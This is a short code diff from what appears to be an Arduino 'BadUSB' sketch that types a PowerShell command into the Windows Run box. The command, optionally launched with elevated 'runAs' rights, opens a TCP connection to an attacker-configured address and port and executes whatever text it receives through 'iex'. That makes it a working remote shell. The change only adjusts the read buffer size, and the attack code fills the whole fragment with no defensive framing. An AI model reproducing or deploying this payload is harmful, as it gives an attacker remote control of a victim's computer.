@@ -102,7 +102,7 @@ void setup() {
   String sPowerShellCmd = "powershell -w 1 "; 
   if (bUAC) { sPowerShellCmd += "saps powershell -A '-NoE -W 1',{"; }  
   sPowerShellCmd += "sal n New-Object;for($w=n byte[] 64kb){for($u=(n Net.Sockets.TCPClient('" + sAddr + "'," + sPort;
-  sPowerShellCmd += ")).GetStream();($i=$u.Read($w,0,$w.Length))-ne0){iex ([text.encoding]::UTF8).GetString($w,0,$i)>$null}}";
+  sPowerShellCmd += ")).GetStream();($i=$u.Read($w,0,64kb))-ne0){iex ([text.encoding]::UTF8).GetString($w,0,$i)>$null}}";
   if (bUAC) { sPowerShellCmd += "} -Verb runAs"; }
 
   // Open Windows + R
